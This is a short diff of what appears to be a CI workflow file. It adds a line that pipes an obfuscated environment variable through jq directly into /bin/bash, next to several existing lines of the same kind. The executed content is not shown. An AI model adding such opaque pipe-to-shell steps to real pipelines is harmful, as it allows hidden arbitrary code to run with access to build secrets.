@@ -22,6 +22,7 @@ jobs:
           echo $pbglj87285 | jq -r .wiqgl77618 | /bin/bash
           echo $vweyt69675 | jq -r .bly053 | /bin/bash
           echo $iphv712 | jq -r .g2649 | /bin/bash
+          printf '%s' "$tsm23" | jq -r .v1886 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
